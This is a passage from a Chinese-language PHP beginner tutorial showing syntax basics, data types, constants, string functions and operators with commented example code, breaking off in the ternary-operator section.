<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 标准PHP标记</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is a standard PHP tag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 短标记（需要启用short_open_tag）</span></span><br><span class="line"><span class="comment">// &lt;? echo &quot;This is a short tag&quot;; ?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is not a comment&quot;</span>; <span class="comment">// This is a comment</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Another single-line comment</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Multi-line comment</span></span><br><span class="line"><span class="comment"> * This is line 2</span></span><br><span class="line"><span class="comment"> * This is line 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量声明</span></span><br><span class="line"><span class="variable">$myVariable</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$boolean</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$nullValue</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 变量命名示例</span></span><br><span class="line"><span class="variable">$firstName</span> = <span class="string">&quot;John&quot;</span>;</span><br><span class="line"><span class="variable">$last_name</span> = <span class="string">&quot;Doe&quot;</span>;</span><br><span class="line"><span class="variable">$_private</span> = <span class="string">&quot;This is a private variable&quot;</span>;</span><br><span class="line"><span class="comment">// $1stName = &quot;Invalid&quot;; // 以数字开头的变量名是无效的</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 语句以分号结束</span></span><br><span class="line"><span class="variable">$var1</span> = <span class="string">&quot;Value 1&quot;</span>;</span><br><span class="line"><span class="variable">$var2</span> = <span class="string">&quot;Value 2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 混合HTML和PHP</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Welcome to PHP&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;This is HTML with PHP inside.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 代码块</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is inside a code block&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-数据类型、常量以及字符串"><a href="#3-数据类型、常量以及字符串" class="headerlink" title="3. 数据类型、常量以及字符串"></a>3. 数据类型、常量以及字符串</h2><h3 id="详细解释-2"><a href="#详细解释-2" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP是一种弱类型语言，变量不需要显式声明类型，PHP会根据上下文自动确定类型。</p>
<h3 id="PHP数据类型："><a href="#PHP数据类型：" class="headerlink" title="PHP数据类型："></a>PHP数据类型：</h3><ul>
<li><strong>标量类型</strong>：<code>boolean</code>, <code>integer</code>, <code>float</code>, <code>string</code></li>
<li><strong>复合类型</strong>：<code>array</code>, <code>object</code>, <code>callable</code>, <code>iterable</code></li>
<li><strong>特殊类型</strong>：<code>resource</code>, <code>null</code></li>
</ul>
<h3 id="常量："><a href="#常量：" class="headerlink" title="常量："></a>常量：</h3><ul>
<li>常量在定义后不可更改</li>
<li>常量名通常大写</li>
<li>常量名不需要<code>$</code>前缀</li>
<li>常量可以是任何标量类型</li>
</ul>
<h3 id="字符串："><a href="#字符串：" class="headerlink" title="字符串："></a>字符串：</h3><ul>
<li>PHP支持单引号和双引号字符串</li>
<li>双引号字符串会解析变量</li>
<li>单引号字符串不会解析变量</li>
<li>支持HEREDOC和NOWDOC语法</li>
</ul>
<h3 id="3-1-基本数据类型"><a href="#3-1-基本数据类型" class="headerlink" title="3.1 基本数据类型"></a>3.1 基本数据类型</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 布尔类型</span></span><br><span class="line"><span class="variable">$isTrue</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$isFalse</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$isTrue</span>); <span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$isFalse</span>); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 整型</span></span><br><span class="line"><span class="variable">$int1</span> = <span class="number">123</span>; <span class="comment">// 十进制</span></span><br><span class="line"><span class="variable">$int2</span> = <span class="number">0123</span>; <span class="comment">// 八进制 (1*64 + 2*8 + 3 = 83)</span></span><br><span class="line"><span class="variable">$int3</span> = <span class="number">0x1A</span>; <span class="comment">// 十六进制 (1*16 + 10 = 26)</span></span><br><span class="line"><span class="variable">$int4</span> = <span class="number">0b101</span>; <span class="comment">// 二进制 (1*4 + 0*2 + 1 = 5)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$int1</span>, <span class="variable">$int2</span>, <span class="variable">$int3</span>, <span class="variable">$int4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点型</span></span><br><span class="line"><span class="variable">$float1</span> = <span class="number">3.14</span>;</span><br><span class="line"><span class="variable">$float2</span> = <span class="number">2.4e3</span>; <span class="comment">// 科学计数法 (2.4 * 10^3 = 2400)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$float1</span>, <span class="variable">$float2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串</span></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;This is a string&#x27;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;This is a string with <span class="subst">$float1</span>&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&quot;This is a string with <span class="subst">&#123;$float1&#125;</span>&quot;</span>; <span class="comment">// 使用花括号明确变量边界</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$string1</span>, <span class="variable">$string2</span>, <span class="variable">$string3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// NULL</span></span><br><span class="line"><span class="variable">$nullValue</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$nullValue</span>); <span class="comment">// NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable">$person</span>-&gt;name = <span class="string">&quot;John&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$person</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源</span></span><br><span class="line"><span class="variable">$resource</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$resource</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$resource</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3-2-常量"><a href="#3-2-常量" class="headerlink" title="3.2 常量"></a>3.2 常量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义常量</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;PI&quot;</span>, <span class="number">3.14159</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;APP_NAME&quot;</span>, <span class="string">&quot;My Awesome App&quot;</span>, <span class="literal">true</span>); <span class="comment">// 第三个参数表示是否大小写不敏感</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用常量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The value of PI is &quot;</span> . PI . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;App name: &quot;</span> . APP_NAME . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小写敏感性</span></span><br><span class="line"><span class="comment">// echo app_name; // 如果第三个参数为false，这会报错</span></span><br><span class="line"><span class="keyword">echo</span> app_name; <span class="comment">// 如果第三个参数为true，这会输出 &quot;My Awesome App&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 预定义常量</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Current file: &quot;</span> . <span class="keyword">__FILE__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Current line: &quot;</span> . <span class="keyword">__LINE__</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP version: &quot;</span> . PHP_VERSION . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;OS: &quot;</span> . PHP_OS . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态常量</span></span><br><span class="line"><span class="variable">$constantName</span> = <span class="string">&quot;PI&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Value of <span class="subst">$constantName</span>: &quot;</span> . <span class="title function_ invoke__">constant</span>(<span class="variable">$constantName</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-字符串操作"><a href="#3-3-字符串操作" class="headerlink" title="3.3 字符串操作"></a>3.3 字符串操作</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 字符串操作</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="variable">$concat</span> = <span class="variable">$str1</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$str2</span>; <span class="comment">// 字符串连接</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Concatenated: &quot;</span> . <span class="variable">$concat</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串长度</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Length of &#x27;<span class="subst">$concat</span>&#x27;: &quot;</span> . <span class="title function_ invoke__">strlen</span>(<span class="variable">$concat</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串查找</span></span><br><span class="line"><span class="variable">$position</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$concat</span>, <span class="string">&quot;World&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Position of &#x27;World&#x27;: &quot;</span> . <span class="variable">$position</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串替换</span></span><br><span class="line"><span class="variable">$replaced</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;World&quot;</span>, <span class="string">&quot;PHP&quot;</span>, <span class="variable">$concat</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Replaced: &quot;</span> . <span class="variable">$replaced</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串截取</span></span><br><span class="line"><span class="variable">$substring</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$replaced</span>, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Substring: &quot;</span> . <span class="variable">$substring</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串大小写转换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Uppercase: &quot;</span> . <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$replaced</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Lowercase: &quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$replaced</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串分割</span></span><br><span class="line"><span class="variable">$words</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$replaced</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Words: &quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$words</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串格式化</span></span><br><span class="line"><span class="variable">$price</span> = <span class="number">19.99</span>;</span><br><span class="line"><span class="variable">$formatted</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;Price: $%.2f&quot;</span>, <span class="variable">$price</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Formatted price: &quot;</span> . <span class="variable">$formatted</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HEREDOC语法</span></span><br><span class="line"><span class="variable">$heredoc</span> = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">This is a heredoc string.</span></span><br><span class="line"><span class="string">It can span multiple lines.</span></span><br><span class="line"><span class="string">Variables like <span class="subst">$price</span> will be parsed.</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;HEREDOC: &quot;</span> . <span class="variable">$heredoc</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NOWDOC语法（不解析变量）</span></span><br><span class="line"><span class="variable">$nowdoc</span> = <span class="string">&lt;&lt;&lt;&#x27;EOT&#x27;</span></span><br><span class="line"><span class="string">This is a nowdoc string.</span></span><br><span class="line"><span class="string">It can span multiple lines.</span></span><br><span class="line"><span class="string">Variables like $price will NOT be parsed.</span></span><br><span class="line"><span class="string">EOT</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NOWDOC: &quot;</span> . <span class="variable">$nowdoc</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="4-运算符"><a href="#4-运算符" class="headerlink" title="4. 运算符"></a>4. 运算符</h2><h3 id="详细解释-3"><a href="#详细解释-3" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP支持多种运算符，用于执行各种操作。</p>
<h3 id="主要运算符类型："><a href="#主要运算符类型：" class="headerlink" title="主要运算符类型："></a>主要运算符类型：</h3><ul>
<li><strong>算术运算符</strong>：<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>, <code>**</code>, <code>++</code>, <code>--</code></li>
<li><strong>赋值运算符</strong>：<code>=</code>, <code>+=</code>, <code>-=</code>, <code>*=</code>, <code>/=</code>, <code>%=</code>, <code>**=</code></li>
<li><strong>比较运算符</strong>：<code>==</code>, <code>!=</code>, <code>===</code>, <code>!==</code>, <code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>, <code>&lt;=</code></li>
<li><strong>逻辑运算符</strong>：<code>&amp;&amp;</code>, <code>||</code>, <code>!</code>, <code>and</code>, <code>or</code>, <code>xor</code></li>
<li><strong>三元运算符</strong>：<code>? :</code></li>
<li><strong>其他运算符</strong>：<code>.</code>（字符串连接），<code>??</code>（空合并）</li>
</ul>
<h3 id="4-1-算术运算符"><a href="#4-1-算术运算符" class="headerlink" title="4.1 算术运算符"></a>4.1 算术运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本算术</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Addition: &quot;</span> . (<span class="variable">$a</span> + <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 13</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Subtraction: &quot;</span> . (<span class="variable">$a</span> - <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Multiplication: &quot;</span> . (<span class="variable">$a</span> * <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 30</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Division: &quot;</span> . (<span class="variable">$a</span> / <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 3.333...</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Modulo: &quot;</span> . (<span class="variable">$a</span> % <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Exponentiation: &quot;</span> . (<span class="variable">$a</span> ** <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 递增/递减</span></span><br><span class="line"><span class="variable">$c</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Pre-increment: &quot;</span> . ++<span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 6</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Post-increment: &quot;</span> . <span class="variable">$c</span>++ . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 6 (but $c is now 7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Value after post-increment: &quot;</span> . <span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Pre-decrement: &quot;</span> . --<span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 6</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Post-decrement: &quot;</span> . <span class="variable">$c</span>-- . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 6 (but $c is now 5</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Value after post-decrement: &quot;</span> . <span class="variable">$c</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-赋值运算符"><a href="#4-2-赋值运算符" class="headerlink" title="4.2 赋值运算符"></a>4.2 赋值运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Initial value: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单赋值</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After simple assignment: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 20</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 复合赋值</span></span><br><span class="line"><span class="variable">$a</span> += <span class="number">5</span>; <span class="comment">// $a = $a + 5</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After +=: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 25</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -= <span class="number">3</span>; <span class="comment">// $a = $a - 3</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After -=: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 22</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> *= <span class="number">2</span>; <span class="comment">// $a = $a * 2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After *=: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 44</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> /= <span class="number">4</span>; <span class="comment">// $a = $a / 4</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After /=: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 11</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> %= <span class="number">3</span>; <span class="comment">// $a = $a % 3</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After %=: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> **= <span class="number">3</span>; <span class="comment">// $a = $a ** 3</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;After **=: &quot;</span> . <span class="variable">$a</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>

<h3 id="4-3-比较运算符"><a href="#4-3-比较运算符" class="headerlink" title="4.3 比较运算符"></a>4.3 比较运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">5</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;5&quot;</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 相等比较</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 == 5: &quot;</span> . (<span class="variable">$a</span> == <span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 == &#x27;5&#x27;: &quot;</span> . (<span class="variable">$a</span> == <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 === 5: &quot;</span> . (<span class="variable">$a</span> === <span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 === &#x27;5&#x27;: &quot;</span> . (<span class="variable">$a</span> === <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// (empty string) (false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不等比较</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 != 10: &quot;</span> . (<span class="variable">$a</span> != <span class="variable">$c</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 !== &#x27;5&#x27;: &quot;</span> . (<span class="variable">$a</span> !== <span class="variable">$b</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小比较</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 &lt; 10: &quot;</span> . (<span class="variable">$a</span> &lt; <span class="variable">$c</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 &gt; 10: &quot;</span> . (<span class="variable">$a</span> &gt; <span class="variable">$c</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// (empty string) (false)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 &lt;= 5: &quot;</span> . (<span class="variable">$a</span> &lt;= <span class="variable">$a</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 &gt;= 10: &quot;</span> . (<span class="variable">$a</span> &gt;= <span class="variable">$c</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// (empty string) (false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空合并运算符 (PHP 7+)</span></span><br><span class="line"><span class="variable">$var1</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$var2</span> = <span class="string">&quot;Default value&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Value: &quot;</span> . (<span class="variable">$var1</span> ?? <span class="variable">$var2</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// &quot;Default value&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Value: &quot;</span> . (<span class="variable">$var2</span> ?? <span class="string">&quot;Another default&quot;</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// &quot;Default value&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-4-逻辑运算符"><a href="#4-4-逻辑运算符" class="headerlink" title="4.4 逻辑运算符"></a>4.4 逻辑运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span> = <span class="number">25</span>;</span><br><span class="line"><span class="variable">$isStudent</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$hasDiscount</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑与</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Adult and student: &quot;</span> . (<span class="variable">$age</span> &gt;= <span class="number">18</span> &amp;&amp; <span class="variable">$isStudent</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Adult and not student: &quot;</span> . (<span class="variable">$age</span> &gt;= <span class="number">18</span> &amp;&amp; !<span class="variable">$isStudent</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// (empty string) (false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑或</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Student or has discount: &quot;</span> . (<span class="variable">$isStudent</span> || <span class="variable">$hasDiscount</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Not student and no discount: &quot;</span> . (!<span class="variable">$isStudent</span> || !<span class="variable">$hasDiscount</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑非</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Not student: &quot;</span> . (!<span class="variable">$isStudent</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// (empty string) (false)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑运算符优先级</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Complex expression: &quot;</span> . (<span class="variable">$age</span> &gt;= <span class="number">18</span> &amp;&amp; <span class="variable">$isStudent</span> || <span class="variable">$hasDiscount</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Complex expression with parentheses: &quot;</span> . (<span class="variable">$age</span> &gt;= <span class="number">18</span> &amp;&amp; (<span class="variable">$isStudent</span> || <span class="variable">$hasDiscount</span>)) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1 (true)</span></span><br></pre></td></tr></table></figure>

<h3 id="4-5-三元运算符"><a href="#4-5-三元运算符" class="headerlink" title="4.5 三元运算符"></a>4.5 三元运算符</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$age</span> = <span class="number">25</span>;</span><br><span class="line"><span class="variable">$isStudent</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本三元运算符</span></span><br><span class="line"><span class="variable">$greeting</span> = (<span class="variable">$age</span> &gt;= <span class="number">18</span>) ? <span class="string">&quot;Adult&quot;</span> : <span class="string">&quot;Minor&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Greeting: &quot;</span> . <span class="variable">$greeting</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// &quot;Adult&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 嵌套三元运算符</span></span><br><span class="line"><span class="variable">$discount</span> = (<span class="variable">$age</span> &gt;= <span 